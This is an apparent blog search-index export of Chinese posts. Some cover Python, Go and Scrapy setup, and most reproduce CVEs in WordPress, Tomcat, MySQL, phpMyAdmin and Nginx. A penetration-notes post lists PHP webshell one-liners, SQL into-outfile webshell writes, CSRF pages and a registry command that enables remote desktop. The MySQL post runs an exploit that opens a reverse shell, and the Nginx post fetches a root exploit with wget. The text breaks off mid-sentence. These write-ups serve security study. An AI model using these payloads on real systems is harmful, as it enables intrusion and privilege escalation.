<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Python27-Scrapy学习(一)]]></title>
    <url>%2Farchives%2F84973573.html</url>
    <content type="text"><![CDATA[以前写爬虫都是自己使用requests、bs4等库手工编写，最近想学学scrapy看看这个爬虫神器有多强大。Install scrapy使用pip安装scrapy即可。1sudo pip install scrapyscrapy的命令常用的有：startproject、shell、crawl等。Scrapy runspider使用scrapy runspider直接运行爬虫脚本。相对项目而言方便快捷。这里我直接使用官方文档的示例。12345678910111213141516171819import scrapyclass QuotesSpider(scrapy.Spider): name = "quotes" start_urls = [ 'http://quotes.toscrape.com/tag/humor/', ] def parse(self, response): for quote in response.css('div.quote'): yield &#123; 'text': quote.css('span.text::text').extract_first(), 'author': quote.xpath('span/small/text()').extract_first(), &#125; next_page = response.css('li.next a::attr("href")').extract_first() if next_page is not None: yield response.follow(next_page, self.parse)使用-o参数可以导出结果。1scrapy runsprider freebuf.py -o result.jsonscrapy startproject使用scrapy startproject创建爬虫项目。Config setting使用scrapy新建爬虫项目，这里我测试站点选择freebuf，建立一个爬虫项目。1scrapy startproject freebuf进入freebuf目录，创建基础爬虫。1scrapy genspider freebufSprider "freebuf.com"之后目录结构如下图：进入freebuf目录下，查看settings.py配置文件。下面列出几个需要修改的配置。123REBOTSTXT_OBEY = False(不遵循Robots.txt规则)USER_AGENT = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'(修改User-Agent)DEFAULT_REQUEST_HEADERS = &#123;'Referer': 'http://www.freebuf.com/'&#125;(设置默认请求头)scrapy crawl一开始对freebuf进行爬虫的时候，发现响应包返回不正确。初步猜测freebuf站点有反爬虫的策略(猜测主要有四点：User-Agent、Cookie、Referer、请求间隔)。为了方便查看请求包，对请求设置HTTP代理。修改settings.py文件中的DOWNOLOAD_MIDDLEAWARES1234DOWNLOADER_MIDDLEWARES = &#123; 'scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware': 110, 'freebuf.middlewares.ProxyMiddleware': 100,&#125;在middlewares.py中增加一个class。12345class ProxyMiddleware(object): # overwrite process request def process_request(self, request, spider): # Set the location of the proxy request.meta['proxy'] = "http://127.0.0.1:8080"如上配置，请求包会通过代理发送到本地8080端口。这里，我使用BurpSuite进行代理拦截。freebufSprider.py文件进行编写，设置cookie。freebuf的cookie最主要的有两个：acw_sc、acw_tc。123456789101112131415161718192021# -*- coding: utf-8 -*-import scrapyfrom scrapy import Requestclass FreebufspriderSpider(scrapy.Spider): name = 'freebufSprider' allowed_domains = ['freebuf.com'] start_urls = ['http://www.freebuf.com'] cookie = &#123; 'acw_sc__': '5b7fb0aee4ffebd067ed819b701014fb3451fcbe', 'acw_tc': '5b7fbdbc6a0b102973a7c8a7b9ecbf0304865342', &#125; def start_requests(self): yield Request(self.start_urls[0], callback=self.parse, cookies=self.cookie) def parse(self, response): title = response.css('title::text').extract_first() self.log(u'编码:%s' % response.encoding) self.log(u'标题:%s' % title)在项目目录下执行1sudo scrapy crawl freebufSpriderscrapy shell也可以使用scrapy的shell进行测试，通过-s USER_AGENT进行请求头设置（不知道为什么使用shell命令，不带cookie也会得到正确的回显）。1sudo scrapy shell -s USER_AGENT='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36' 'http://www.freebuf.com总结针对不同站点写爬虫的时候，首先需要对站点有所了解：robots.txt、反爬虫机制等。Scarpy爬虫项目相对自己编写的爬虫，整体感强，作为一整个项目来进行编写。以前的那种写法，经常一个脚本就要包含一大堆东西，到最后整体很乱，不利于后期代码维护；用Scrapy或者Requests&amp;bs4都需要对目标站点需要有所了解；单个脚本的scrapy提供了导出等API接口，相对自己些的更方便。]]></content>
      <categories>
        <category>Code</category>
        <category>Python27</category>
      </categories>
      <tags>
        <tag>scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[蚁剑MacOS版本-app类型]]></title>
    <url>%2Farchives%2F221b42d4.html</url>
    <content type="text"><![CDATA[在Mac上运行蚁剑每次都需要npm start，感觉太繁琐了。因此，想把蚁剑打包成app方便使用。成功打包效果图如下，这里给大家提供打包出来的dmg。链接:https://pan.baidu.com/s/1Z4NwAMwcOadof93_1na8mA 密码:eokx前期准备安装brew12/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"brew --version安装node123brew install nodenode --versionnpm --version安装yarn12brew install yarnyarn --version安装electron-builder，安装成功之后需要建立软连接1234yarn install electron-builder -devsudo find / -name electron-builderln -s /Users/hywell/node_modules/.bin/electron-builder /usr/local/bin/electron-builderelecctron-builder --version下载蚁剑，安装依赖并启动1234git clone https://github.com/AntSwordProject/antSword.git'cd antSwordnpm installnpm start打包修改antSword目录下的package.json，结构如下：1234567891011121314151617181920212223242526272829303132333435363738394041&#123; "name": "antsword", "version": "1.3.0", "description": "中国蚁剑是一款跨平台的开源网站管理工具", "main": "app.js", "build": &#123; "appId": "1.0", "mac": &#123; "category": "public.app-category.developer-tools", "target": [ "dmg" ] &#125; &#125;, "scripts": &#123; "start": "electron app.js", "build": "npm start", "pack": "electron-builder --dir", "dist": "electron-builder" &#125;, "author": "antoor &lt;u@uyu.us&gt;", "license": "MIT", "repository": &#123; "type": "git", "url": "https://github.com/antoor/antSword" &#125;, "debug": true, "update": &#123; "md5": "184c9217b01513647ccfaad49e795cfe", "logs": "移除webpack以及其他不必要的依赖，直接无需编译即可执行ES6代码\n更新美化关于页面\n重构modules/request.js后端数据请求模块\n添加 aspx hex encoder 支持\n修正custom shell 读取自身时数据被截断的 bug\n增加php中的mysql数据库模板，用于不支持使用mysqli的服务器\n以及其他小部分的代码重构优化", "sources": &#123; "coding.net": "https://coding.net/api/share/download/c405db5d-6fdb-4078-9326-32cd86c392a3", "github": "https://github.com/antoor/antSword/releases/download/1.3.0/update.zip" &#125; &#125;, "bugs": &#123; "url": "https://github.com/antoor/antSword/issues" &#125;, "homepage": "http://uyu.us", "postinstall": "electron-builder install-app-deps"&#125;在antSword目录下新建一个app文件夹，将antSword目录下所有文件迁移到app文件夹下。结构如下:在里面新建一个package.json文件，结构如下:12345678910111213141516171819202122&#123; "name": "antsword", "version": "1.3.0", "main": "app.js", "description": "antsword-MacOS", "author": "antoor &lt;u@uyu.us&gt;", "dependencies": &#123; "babel": "^5.2.17", "extract-zip": "^1.5.0", "geoips": "0.0.1", "iconv-lite": "^0.4.13", "log4js": "^0.6.29", "nedb": "^1.5.1", "nugget": "^2.0.0", "superagent": "^3.8.3", "superagent-proxy": "^1.0.0", "through": "^2.3.8" &#125;, "devDependencies": &#123; "electron-prebuilt": "^0.37.2" &#125;&#125;在antSword目录下，执行命令将其打包。1yarn dist完成之后会生成一个dist目录，在目录中就有成功打包的antSword。总结这次耗费了大半天的时间，查阅了无数资料，发现还是官方的文档最好！elecctron-builder打包程序时，需要建立一个app文件夹&amp;两个package.json（一个作为开发使用，一个作为程序使用）;elecctron-builder打包程序时，把所有程序的资源文件、代码文件等都放到app文件夹下。]]></content>
      <categories>
        <category>安全研究</category>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MacOS python27 pycurl安装]]></title>
    <url>%2Farchives%2F366a0bef.html</url>
    <content type="text"><![CDATA[MacOS安装pycurl的时候出了一堆问题：SSL、Permitted等，用网上的一堆方法都无法成功安装。最后，通过查看pycurl官网文档、网上资料结合，终于安装成功！前言一开始使用easy_install、pip两种安装方式都会遇到SSL报错。查询网上资料，指定openssl的环境变量并指定使用openssl安装也无法解决。解决过程下载pycurl源码，解压到对应目录。sudo python setup.py install --with-openssl --openssl-dir=/usr/local/opt/openssl其中”openssl-dir”需要根据自身电脑安装路径进行设置。使用上诉命令会出现权限不够的问题，通过添加–user可以解决。sudo python setup.py install --with-openssl --openssl-dir=/usr/local/opt/openssl --user总结MacOS安装东西真麻烦！！！]]></content>
      <categories>
        <category>Code</category>
        <category>Python27</category>
      </categories>
      <tags>
        <tag>pycurl</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2017-5487分析]]></title>
    <url>%2Farchives%2F5a5cf5bb.html</url>
    <content type="text"><![CDATA[针对Content Injection Vulnerability in WordPress进行复现并分析。漏洞简述由于WordPress4.7.0-4.7.1REST API接口权限判断不合理导致命令注入。漏洞分析复现过程下载POC脚本，运行即可。原理分析查看/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php的第90行，发现参数ID的值会被过滤成数字。发现REST API在管理访问时，其会在正则表达式之前优先考虑$_GET和$_POST的值。例如: /wp-json/wp/v2/posts/1234?id=12345helloworld，REST API会将其ID参数设置成12345helloworld。在99行使用了update_item和update_item_permissions_check。查看593行的update_item_permissions_check函数，其将ID值传递给get_post()函数。这个函数功能用来检查帖子是否存在、是否有权限。如果发送的ID没有对应的post，就可以绕过权限检查，并允许继续执行update_item方法。由于使用get_instance()静态方法来获取post，造成get_post()在特定情况下无法找到对应的ID。查看/wordpress/wp-includes/class-wp-post.php第210行，发现需全部使用数字，例如123ABC将会导致获取post失败。有一个细节，其会将ID参数在传递给get_post之前会将其转换成整数。PHP语言中做类型的比较和转换时，其会返回整数。例如例如提交一个请求为/wp-json/wp/v2/posts/123?id=456ABC，PHP会将其ID返回456。由于456ABC并不是纯数字会导致/wordpress/wp-includes/class-wp-post.php获取post_id失败。在流程进入权限检查时update_item_permissions_check判断其没有对应的post绕过权限判断，进行更新操作update_item。最终导致ID为456被修改。在受影响的WordPress版本中REST API接口是默认开放的。任何用户都可以利用该漏洞修改任意文章，只需要指定修改文章的ID即可。修改前：修改后：复现注意事项在复现时如果遇到id is not of type integer报错信息，有可能是因为版本不对。最新版本的4.7.2已经对该漏洞进行修复。修复建议升级WordPress至4.7.2及以上。]]></content>
      <categories>
        <category>安全研究</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2016-8735分析]]></title>
    <url>%2Farchives%2Fc77f03de.html</url>
    <content type="text"><![CDATA[针对CVE-2016-8735复现并分析。漏洞简述Tomcat启动JmxRemoteLifecycleListener监听器，在/conf/server.xml中添加Tomcat默认未开启JmxRemoteLifecycleListener监听器。在实际环境中，使用zabbix（是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案）通过JMX监控tomcat即会产生该漏洞环境。漏洞分析复现过程1java -cp ysoserial-0.0.5-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit localhost 10001 Groovy1 calc.exePOC分析根据攻击命令发现攻击函数为RMIRegistryExploit在ysoserial-0.0.5-SNAPSHOT-all.jar包中的ysoserial.exploit中。通过解压缩软件将RMIRegistryExploit从ysoserial-0.0.5-SNAPSHOT-all.jar解压出来。由于解压出来为class，对其进行反编译。第13行定义了RMIRegistryExploit类，第20行需传递一个数组，21行抛出Exception异常类型。第23行-25行定义了host为数组的第一位数值，port（int）为数组的第二位数值（通过Integer.parseInt将整形对象转换成int型），command为数组的第三位数值。在26行使用java.rmi.registry.LocateRegistry中的LocateRegistry.getRegistry方法来返回对Registry对象的引用。在27行定义一个string 名字为className，通过StringBuilder创建一个新实例（结合后面代码中的append可发现用于快速进行字符相加），并获取CommonsCollections1的包的名字，最后把待执行的命令加上包的名字整体作为string赋值给className。28行获得该类(className)并初始化该类。第29行执行exploit.warp，传递三个参数；第35行使用ExecCheckingSecurityManager的wrap并传一个对象，该对象包含三个参数（payloadClass、command、registry），跟踪ExecCheckingSecurityManager（ysoserial.secmgr.ExecCheckingSecurityManager）查看warp的作用（用于并发）。倒回去看RMIRegistryExploit.java，className来源于CommonsCollections1，跟踪CommonsCollections1类（ysoserial.payloads. CommonsCollections1），该类继承了PayloadRunner。跟踪PayloadRunner（ysoserial.payloads.util. PayloadRunner）的run方法，在第22行发现该方法将传进来的args、clazz并发设为新对象并转换成byte。第29行使用Deserializer.deserialize将serialized反序列化赋值为对象obj。倒回去看CommonsCollections1，第41行到53行，用Transformer创建了transformers数组，数组中按顺序包含了ConstantTransformer、InvokerTransformer、InvokerTransformer、InvokerTransformer、ConstantTransformer对象。ConstantTransformer获取其构造函数中传入的类；InvokerTransformer执行其构造函数中传入的方法。跟踪transformers，第58行使用Reflections.setFieldValue();方法：利用反射机制，将transformerChain对象的iTransformers属性赋值为transformers。修复建议升级Tomcat改变JMX密码认证]]></content>
      <categories>
        <category>安全研究</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2016-6663分析]]></title>
    <url>%2Farchives%2Fe5fd1c70.html</url>
    <content type="text"><![CDATA[针对MySQL / MariaDB / PerconaDB - 提权/条件竞争漏洞进行复现并分析。漏洞简述存在条件竞争漏洞，导致本地用户使用低权限帐号提升到数据库系统用户。漏洞分析复现过程查看数据库版本:mysql -V。建立低权限数据库用户，并新建库。下载CVE-2016-6663 POC，并编译。查看当前用户id.运行CVE-2016-6663 POC。下载CVE-2016-6664 POC 并更改权限。运行CVE-2016-6664 POC。原理分析MySQL数据库可以通过data directory指定存储目录，并将目录权限更改为mysql。复现注意事项缺少mysql.h，安装libmysqlclient-dev。修复建议升级MySQL；在my.cnf中添加：symbolic-links = 0。]]></content>
      <categories>
        <category>安全研究</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2016-6662分析]]></title>
    <url>%2Farchives%2F438a17c4.html</url>
    <content type="text"><![CDATA[针对MySQL Code Execution Privilege Escalation进行漏洞复现并分析。漏洞简述在MySQL / MariaDB / PerconaDB 5.5.52 / 5.6.33 / 5.7.15等版本中，默认安装MySQL使用自带mysqld_safe脚本启动mysql服务进程，在启动mysql server之前预加载共享库文件，共享库文件可被添加至my.cnf。漏洞分析复现过程下载cve-2016-6662_MySQL_RCE_exploit.py和mysql_hookandroot_lib.c，并放同一目录下（.so文件运行py时会自动生成）。修改mysql_hookandroot_lib.c第63行（攻击服务器IP）、64行（监听端口）、65行（my.cnf路径）。运行py脚本。1python cve-2016-6662_MySQL_RCE_exploit.py -dbuser root -dbpass '' -dbname pocdb -dbhost 127.0.0.1 -mycnf /etc/mysql/my.cnf这时候，查看/etc/mysql/my.cnf文件，发现共享库已经成功添加。重启mysql服务，成功反弹shell。原理分析默认安装MySQL会自带mysql_safe脚本，启动MySQL之前加载共享库，共享库可以添加至my.cnf。跟进/usr/bin/mysqld_safe，在第331行看到–malloc-lib=LIB 选项可以加载一个so文件。在424行，可以看到mysqld_safe从mysql的data目录下载入配置文件my.cnf。使用ps aux | grep mysql，查看MySQL的进程信息，发现mysqld_safe是root权限执行的，mysqld是mysql用户执行的。在my.cnf中写入malloc_lib加载so文件的路径。使用gcc命令将.c（shell）编译成so，并将so放置到/var/lib/mysql/目录下。配置文件和so文件冲准备就绪，重启MySQL，root运行mysqld_safe，mysqld_safe加载so文件，则触发代码执行。复现注意事项/etc/mysql/my.cnf权限设置：12chown mysql:root /etc/mysql/my.cnfchmod 600 /etc/mysql/my.cnf攻击会在攻击database新建一个表，表名为:poctable，如果攻击失败，重新攻击需将poctable删除。123mysql -uroot -p；use pocdb;（攻击database的数据库名字）drop table poctable;py脚本会自动运行nc，因此攻击服务器需要安装nc。如果攻击端口不为3306，可以在cve-2016-6662_MySQL_RCE_exploit.py第74行增加自定义端口代码。增加完成之后，即可使用-dbport自定义端口。在第83行，增加代码将其使用。12parser.add_argument('-dbport', dest='TARGET_PORT', required=True, help='MySQL port') # 74行dbconn = mysql.connector.connect(user=args.TARGET_USER, password =args.TARGET_PASS, database=args.TARGET_DB, host=args.TARGET_HOST, port=args.TARGET_PORT) # 83行修复建议升级MySQL。]]></content>
      <categories>
        <category>安全研究</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2016-5734分析]]></title>
    <url>%2Farchives%2F94f683da.html</url>
    <content type="text"><![CDATA[针对phpMyAdmin 4.6.2 - Authenticated Remote Code Execution进行漏洞复现并分析。漏洞简述phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。在4.6.2版本中preg_replace /触发的callback导致命令执行。漏洞分析复现过程下载POC并执行即可。漏洞分析这个漏洞出现在TableSearchController.php中的getRegexReplaceRows函数。跟进/libraries/controllers/table/TableSearchController.php，第708行定义getRegexReplaceRows函数，在第731行处$find存在任意一个范围符号的时候,在$find前面加上/。在661行getReplacePreview函数调用了getRegexReplaceRows。在613行findAction函数调用了getReplacePreview。在175行indexAction函数调用了findAction，当searchType为replace调用findAction。在/tbl_find_replace.php第33行调用indexAction。根据以上可得知，调用getRegexReplaceRows函数的流程为：12345/tbl_find_replace.ph →/libraries/controllers/table/TableSearchController.php indexAction() →/libraries/controllers/table/TableSearchController.php findAction() →/libraries/controllers/table/TableSearchController.php getReplacePreview() →/libraries/controllers/table/TableSearchController.php _getRegexReplaceRows()当row[0]成功匹配$find即可执行命令，在716，717行存在db、table两个成员。在/libraries/controllers/TableController.php第20、25行分别定义了$db、$table。回溯Controller类，跟进/libraries/di/Container.php，在51行定义get函数。当$find构造为0/e0，preg_replace将$find变成/0/e0/，在php5.5以下发生截断，变成preg_replace(/0/e, command,0/e)。由此代码执行产生。修复建议升级phpMyAdmin。]]></content>
      <categories>
        <category>安全研究</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2016-1240分析]]></title>
    <url>%2Farchives%2F29004be5.html</url>
    <content type="text"><![CDATA[针对Apache Tomcat 8/7/6 (Debian-Based Distros) - Privilege Escalation进行漏洞复现并分析。漏洞简述Debian系统的Linux上，使用apt-get安装Tomcat时,deb包安装的Tomcat程序会自动为管理员安装一个启动脚本：/etc/init.d/tomcat* 利用该脚本，可导致攻击者通过低权限的Tomcat用户获得系统root权限。只需要将Tomcat的日志文件catalina.out软链接到系统文件，重新打开catalina.out就可获取root权限。漏洞分析复现过程获取POC脚本，运行POC脚本。1./tomcat-rootprivesc-deb.sh /var/log/tomcat7/catalina.out运行之后/var/log/catalina.out的链接已经指向/etc/ld.so.preload。重启Tomcat服务。1serverce tomcat7 restartPOC分析POC脚本85行判断用户是否为tomcat用户。93行判断指定的tomcat日志文件是否存在。158行删除日志文件并软链接到/etc/ld.so.preload。168行判断/etc/ld.so.preload文件是否存在。188行通过判断/tmp/tomcatrootsh文件是否具有rws 权限 root 匹配到返回0。199行删除/etc/ld.so.preload和/tmp/privesclib.so。跟踪$BACKDOORPATH变量，在148行$BACKDOORPATH是从$BACKDOORSH复制而来，根据开头变量的定义发现$BACKDOORSH为/bin/bash。修复建议升级Tomcat。]]></content>
      <categories>
        <category>安全研究</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python3 pip缺失VC++]]></title>
    <url>%2Farchives%2Ff62064af.html</url>
    <content type="text"><![CDATA[最近使用python3的pip安装scrapy、mysql-python等库出错，需要安装Microsoft Visual C++。网上资料大部分通过源码方式解决，不能一劳永逸解决。这里我从根源解决。VC++缺失使用pip install scrapy安装scrapy出现缺失VC++。根据报错信息打开VC Build Tools站点点击红框中的链接，找到Visual Studio 2017 生成工具下载对应文件。打开下载下来的vs_buildtools程序，勾选Visual C++生成工具，进行安装。接下来安静等待安装完成。安装完成之后，再使用pip install scrapy即可成功安装。]]></content>
      <categories>
        <category>Code</category>
        <category>Python36</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>Python36</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Go-VSCode环境搭建]]></title>
    <url>%2Farchives%2Fc70ca2a9.html</url>
    <content type="text"><![CDATA[最近项目上用到了Go，因此对VSCode进行Go环境搭建。效果图如下：GoGo安装去Golang官网下载对应版本的安装包，我这里是Windows操作系统，因此下载go1.10.2.windows-amd64.msi。由于Golang官网需要科学上网，如果没有翻墙的软件，可以去Go语言中文网下载，下载页面。安装过程直接Next过去即可。安装完成之后，打开CMD输入go version查看go 版本信息。Go环境配置Go安装完成之后，在CMD下输入go env查看go的环境变量。有两个关键的变量：GOROOT、GOPATH。GOROOT为Go安装目录不需要进行修改，GOPATH为Go项目地址可以进行修改。在喜欢的地方建立一个Go项目目录。这里我在C盘根目录下建立一个文件夹，名称为GoWork。然后将其配置到系统环境变量中。配置完成之后，重新打开一个CMD输入go env查看是否生效。到此Go的配置告一段落。VSCodeVSCode安装去Visual Studio Code官网下载对应版本的安装包安装即可。安装过程直接Next过去即可。VSCode安装完成之后需要配置Git，可以查看这篇文章搭建博客，这里就不展开了。VSCode环境配置Go插件安装在VSCode商店里面安装对应Go插件。可以直接通过VSCode欢迎使用页面的自定义→工具和语言→更多进行跳转。安装完成之后打开Go项目文件夹，新建一个hello.go，打开hello.go，在右小角进行点击Install All安装所依赖的库（该步骤需要翻墙）。安装完成之后，在工作目录下会多出一个bin子目录里面会放所需要的exe文件。如果翻不了墙，那么可以直接下载这个，放到Go项目文件夹下的bin目录即可。链接：https://pan.baidu.com/s/19w01LlfY8iEsLm5gJmP5Lw 密码：umaoDebug完成以上操作之后，可以通过F5进行Debug。总结在进行VSCode进行Go Debug时，遇到了几个需要注意点，在此记录一下供诸君参考：完成Go安装之后，需要进行GOPATH环境变量配置，便于项目目录查找；完成VSCode安装之后，在VSCode的终端里面输入go命令查看VSCode是否能调用系统环境变量。如果在VSCode终端找不到go命令，在用户环境变量里面进行添加可以解决该问题。假设还解决不了，直接在终端进行path环境变量追加set path=%path%;C:\go\bin；如果VSCode依赖的库安装失败，直接把src、bin、pkg目录都删除，然后重新安装。Go代码1234567package mainimport "fmt"func main() &#123; fmt.Println("Hello, Hywell")&#125;]]></content>
      <categories>
        <category>Code</category>
        <category>Go</category>
      </categories>
      <tags>
        <tag>环境搭建</tag>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2016-1247分析]]></title>
    <url>%2Farchives%2Feca7756b.html</url>
    <content type="text"><![CDATA[针对CVE-2016-1247漏洞进行复现、研究分析原理。前言Nginx是一个高性能的HTTP和反向代理服务器，也是一个 IMAP/POP3/SMTP 代理服务器。 Nginx 是由 Igor Sysoev 为俄罗斯访问量第二的 Rambler.ru 站点开发的，第一个公开版本0.1.0发布于2004年10月4日。其将源代码以类BSD许可证的形式发布，因它的稳定性、丰富的功能集、示例配置文件和低系统资源的消耗而闻名。2011年6月1日，nginx 1.0.4发布。 Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。由俄罗斯的程序设计师Igor Sysoev所开发，其特点是占有内存少，并发能力强。漏洞简述Debian、Ubuntu发行版的Nginx在新建日志目录的时，使用了不安全的权限，因此本地恶意攻击者可以从nginx/web用户权限(www-data)提升到ROOT。漏洞分析复现过程查看用户ID查看Nginx版本dpkg -l | grep -i nginx下载poc脚本1wget https://legalhackers.com/exploits/CVE-2016-1247/nginxed-root.sh修改poc权限,并执行poc12chmod 777 nginxed-root.sh./nginxed-root.sh /var/log/nginx/error.log查看现在用户IDPOC分析查看Nginx日志目录权限，发现为www-data，因此该漏洞需要使用www-data用户进行查看Nginx日志目录下的文件权限，发现为root权限，通过符号链接将替换日志文件实现提权目的根据POC进行利用分析，在145行使用dlsym获取euid在147、148行修改/tmp/nginxrootsh文件的所有者和权限在149行删除/etc/ld.so.preload文件在154行编译生成的c文件，在其后判断是否编译成功在162行将/bin/bash拷贝到/tmp/nginxrootsh在172行删除nginx的错误日志文件并进行符号链接，将/etc/ld.so.preload（目标）软链接到nginx的错误日志（这步骤实现了提权）在187行将/etc/ld.so.preload内容覆盖为/tmp/privesclib.so（加载/tmp/privesclib.so共享库）在199行将/etc/ld.so.preload权限设置为755注意事项root用户执行logrotate -f /etc/logrotate.d/nginx，未获取到root权限情况下重启nginx服务并删除相关文件。修复建议升级Nginx版本。]]></content>
      <categories>
        <category>安全研究</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透笔记整理]]></title>
    <url>%2Farchives%2Fff82748e.html</url>
    <content type="text"><![CDATA[最近在整理印象笔记，其中有许许多多经验、研究和杂七杂八的想法，我会逐步上传到博客。渗透笔记CSRFCSRF全名是Cross-site request forgery，理解上为伪造其他用户执行操作。攻击网页没有token头字段，通过请求拦截的方式，将对应URL记录下来。通过构建一个恶意页面，恶意页面代码如下:1234567# GET类型&lt;img src="操作行为的URL"&gt; # POST类型&lt;form id="aa" action="操作行为的UR" method="post" name="form1"/&gt;&lt;input type="submit" name="button" id="button" style="display:none;"/&gt;&lt;script&gt;window.location = "http://x.x.x.x";&lt;/script&gt;诱使对应人员点击该页面即可触发CSRF攻击。防御思路针对CSRF攻击，防御方面：在重要操作执行钱需要进行验证码校验站点添加token（或者自定义）头字段。由于token是随机并且一次性。在使用post方法时，防止token出现在URL（可以通过构建恶意网站 使用户访问恶意网站 恶意网站在后台构建假冒用户操作）通过抓包删除referer 测试针对CSRF攻击总结：防御方面为对操作进行用户身份验证；攻击方面可以构建的代码：form iframe img xhr link等。攻击衍生可以将XSS与CSRF结合：通过XSS让用户跳转到CSRF页面执行恶意操作。SQL InjectionSQL Injection通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。攻击思路最简单的注入思路就是针对id=、class=这些参数进行注入。看到过一次二次注入的思路：注册用户时将用户名设置成注入语句，在个人中心处注入语句被调用形成注入。因此，允许输入与数据库交互那么便有可能存在注入。例如cookie等报文头里面的数据，如果数据库会记录该数据那变可能存在注入。攻击衍生当站点对输入进行过滤（防御），可以尝试使用编码转换，将注入语句转码。内网渗透内网渗透是指渗透人员获取了一台内网主机时，针对内网进行内网渗透的过程。123456789101112131415Windows# 查看用户权限whoami# 提权 pr # 开启远程桌面REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f# 查看计算机信息systeminfo# 获取密码mimikatz# 进程信息tasklist /svc # 查看端口 netstart -an上传漏洞IIS6.01.目录名称为a.asp，该目录下的文件都会以asp解析；2.上传a.asp;.xx.jpg类型的文件，由于IIS6.0解析”;”会截断，所以在解析时可以理解为以asp文件类型解析。IIS7.0/7.5+Nginx≤0.8.37IIS7.0/7.5，在PHP配置文件中，开启了cgi.fix_pathinfo（该配置默认开启），当文件为php类型，iis会交给php解析；nginx和iis7.5类似:Fast-CGI开启状况（默认），上传内容为:1&lt;?php fputs(fopen('cmd.php','w'),'&lt;?php eval($_POST[cmd])?&gt;');?&gt;的x.jpg。访问../../../x.jpg/.php会在根目录下生成一个cmd.php;在文本前面加上 Gif89a 让服务器以为该文本为图片类型文件;双文件上传 通过在上传&lt;input type=&quot;FileName&quot; type=&quot;FILE&quot;&gt;后面在加入&lt;input type=&quot;FileName&quot; type=&quot;FILE&quot;&gt;。下载网页源码 另存为到桌面 然后第一个地方上传正常图片 第二个地方上传马;上传一句话木马可以对一句话多次加密。上传成功之后，如果连接一句话被防护设备阻断，可以通过修改菜刀进行连接。原理是因为当前防护设备是针对网络流量进行识别，当流量中出现对应关键字会进入识别流程，当所有条件都满足时就会阻断该流量。该方式绕过方式千千万，只要特征不命中即可。SQL命令记录MySQL数据库在渗透的时候可以用到的命令：123456789101112131415161718192021222324252627282930# 导出文件Select '&lt;? php eval($_POST[cmd]);?&gt;' into outfile 'F:/wwwroot/eval.php';## 导出一句话create table cmd (a varchar(50));insert into cmd (a) values ('一句话木马');select * into [a] in 'e:\web\webshellcc\1.asa;x.xls' 'excel 4.0;'from cmd;drop table cmd;Select 'asp一句话木马' into [vote] in 'e:\web\webshellcc\1.asa;x.xls' 'excel 8.0;' fromvote;select into outfile(dumpfile); //MySQL写文件命令 (例如：select "&lt;?php echo 'test'; ?&gt;" into outfile "F:\\www\\test.php";）# 系统用户名system_user()# 用户名user()# 当前用户名current_user# 连接数据库的用户名session_user()# 数据库名database()# MYSQL数据库版本version()# MYSQL读取本地文件的函数load_file()# 读取数据库路径@@datadir# MYSQL 安装路径@@basedir# 操作系统@@version_compile_osPHP爆破路径1.错误参数爆路径2.google搜索： sieze:xxx.com warning size:xxx.com phpmyadmin(phpMyadmin3.测试文件爆路径 test.php ceshi.php info.php4.注入点读取配置文件 load_file小迪学习笔记我在刚刚接触渗透的时候，经常会看小迪的渗透教程视频。那时候，边学边记。小迪第一讲小迪第一讲主要讲解一下基础的知识，便于后期理解。软件：APMServ1234567891011# web环境iis6.0（Windows2003）iis7.X（win7 Windows2008）Apache（linux Windows）# 常见搭配asp + access + iisasp + sqlserver + iisphp + mysql + Apache tomcat jsp + sqlserver + tomcatjsp + oracle +tomcataspx + sqlserver + iis小迪第四讲一个页面 http://www.xxx.com/xxx.asp?id=xx,存在cookie注入。使用SQLMap进行攻击，命令如下：`sqlmap： sqlmap.py -u http://www.xxx.com/xxx.asp –cookie “id=xx” –level 2`小迪第五讲数字型注入：and 1=1。例如:select from admin where id=1字符型注入：&#39; and 